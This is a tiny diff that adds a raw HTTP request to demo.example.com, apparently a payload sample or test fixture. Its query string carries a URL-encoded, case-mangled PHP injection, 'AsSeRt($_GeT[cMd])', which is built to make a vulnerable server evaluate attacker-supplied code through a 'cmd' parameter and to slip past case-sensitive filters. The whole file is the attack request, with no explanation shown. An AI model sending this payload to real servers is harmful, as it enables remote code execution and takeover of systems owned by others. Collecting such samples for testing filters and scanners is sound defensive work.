@@ -1,0 +1,4 @@
+GET /a?id=a%3DAsSeRt($_GeT[cMd]) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
